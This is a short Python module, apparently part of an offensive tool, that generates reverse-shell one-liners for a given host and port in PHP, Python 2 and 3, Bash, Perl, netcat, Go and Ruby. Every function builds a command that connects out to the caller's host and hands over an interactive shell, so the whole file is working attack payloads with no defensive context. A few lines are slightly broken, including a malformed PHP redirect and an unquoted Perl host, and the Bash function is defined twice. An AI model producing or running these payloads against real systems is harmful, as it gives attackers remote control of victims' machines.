

#Payloadsi

def php(host,port):

    cmd = f"php -r'$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2 \");'"

    return cmd

def python2(host,port):

    cmd = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"

    return cmd

def python3(host,port):

    cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
    
    return cmd

def bash(host,port):

    cmd = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"

    return cmd


def perl(host,port):

    cmd = "perl -e 'use Socket;$i="+host+";$p="+str(port)+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

    return  cmd

def bash(host,port):

    cmd = f"bash -i>& /dev/tcp/{host}/{port} 0>&1"

    return cmd

def netcat(host,port):

    cmd = f"nc -e /bin/sh {host} {port}"

    return cmd

def golang(host,port):

    cmd = "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\""+host+":"+port+");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"

    return cmd

def ruby(host,port):

    cmd = f"ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

    return cmd


